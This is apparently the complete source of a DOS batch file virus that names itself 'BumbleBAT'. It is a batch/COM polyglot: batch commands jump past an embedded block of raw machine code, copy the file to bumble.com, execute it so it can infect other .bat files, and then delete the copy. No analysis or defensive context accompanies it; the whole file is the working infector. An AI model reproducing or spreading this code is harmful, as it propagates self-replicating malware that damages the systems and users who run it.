REM  �B
@echo off
goto bvc
*.bat 
[BumbleBAT virus]
What a virus!
$� *�!��u�	�$�!���R.� �N� ��!rR� Z�O�!s�L�!�=�� ��!r[��B3�3��!�uI= �sDP� B3�3��!� ?YQ���!X�Ⱦ& ;�w.���[tQ� B3�3��!� @� ���!� @��Y�!�=�!�
:bvc
@echo off
if not exist *.bat goto endV
if not exist %0 goto addBat
copy %0 bumble.com
goto execVC
:addBat
copy %0.bat bumble.com > nul
:execVC
bumble.com
del bumble.com > nul
:endV
@echo on
